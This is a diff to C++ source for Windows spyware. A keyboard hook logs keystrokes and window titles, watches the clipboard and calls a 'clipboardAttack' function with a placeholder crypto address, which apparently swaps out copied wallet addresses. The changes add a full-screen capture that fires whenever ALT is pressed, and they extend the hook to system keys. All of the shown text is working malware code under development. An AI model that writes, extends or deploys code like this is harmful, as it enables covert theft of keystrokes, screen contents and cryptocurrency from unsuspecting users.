@@ -1,4 +1,5 @@
 #pragma comment(lib, "User32.lib")
+#pragma comment(lib, "gdi32.lib")
 #include <iostream>
 #include <windows.h>
 #include <fstream>
@@ -123,17 +124,31 @@ void writeClipboardChange(){
 }
 
 void	takeScreen(){
-	/*HDC hScreenDC = GetDC(nullptr);
-	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
-	int width = GetDeviceCaps(hScreenDC,HORZRES);
-	int height = GetDeviceCaps(hScreenDC,VERTRES);
-	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC,width,height);
-	HBITMAP hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC,hBitmap));
-	BitBlt(hMemoryDC,0,0,width,height,hScreenDC,0,0,SRCCOPY);
-	hBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC,hOldBitmap));
-	DeleteDC(hMemoryDC);
-	DeleteDC(hScreenDC);*/
-	Sleep(400);
+	int x1, y1, x2, y2, w, h;
+
+	// get screen dimensions
+    x1  = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    y1  = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    y2  = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    w   = x2 - x1;
+    h   = y2 - y1;
+
+	// copy screen to bitmap
+    HDC     hScreen = GetDC(NULL);
+    HDC     hDC     = CreateCompatibleDC(hScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
+    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
+    BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
+
+	// save bitmap to clipboard
+    OpenClipboard(NULL);
+    EmptyClipboard();
+    SetClipboardData(CF_BITMAP, hBitmap);
+    CloseClipboard();
+	std::cout << "screen taken??" << std::endl;
+
+	//Sleep(400);
 	std::cout<<"Format Bitmap: "<<IsClipboardFormatAvailable(CF_BITMAP)<<"\n";
     std::cout<<"Format DIB: "<<IsClipboardFormatAvailable(CF_DIB)<<"\n";
     std::cout<<"Format DIBv5: "<<IsClipboardFormatAvailable(CF_DIBV5)<<"\n";
@@ -158,8 +173,10 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		result = L"[SHIFT]";
 	else if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL)
 		result = L"[CTRL]";
-	else if (vkCode == VK_MENU)
+	else if (vkCode == VK_LMENU || vkCode == VK_RMENU){
 		result = L"[ALT]";
+		takeScreen();
+	}
 	else if (vkCode == VK_CAPITAL)
 		result = L"[CAPS]";
 	else if (vkCode == VK_ESCAPE)
@@ -174,7 +191,7 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		result = L"[DOWN ARROW]";
 	else if (vkCode == VK_SNAPSHOT){
 		result = L"[PRINT SCREEN]";
-		takeScreen();
+		//takeScreen();
 	}
 	else if (vkCode == VK_NUMLOCK)
 		result = L"[NUMLOCK]";
@@ -221,10 +238,12 @@ LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
 
 
 	//PROGRAM EXITS WHEN TAKING A SCREEN (CLIPBOARD DATA ISN't WRITABLE, probably should check before with IsClipboardFormatAvailable)
-    if (wParam == WM_KEYDOWN){
+    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
 		currentWindowTitle = getWindowTitle();
 		currentClipboardSequenceNumber = GetClipboardSequenceNumber();
 		std::cout << "clipboard sequence :" << GetClipboardSequenceNumber() << std::endl;
+		std::cout << "vk code: " << s->vkCode << std::endl;
+		std::cout << "scan code: " << s->scanCode << std::endl;
 		if (currentClipboardSequenceNumber != g_prevClipboardSequenceNumber){
 			writeClipboardChange();
 			clipboardAttack(L"0x000000000000000000000000000000000000dEaD");
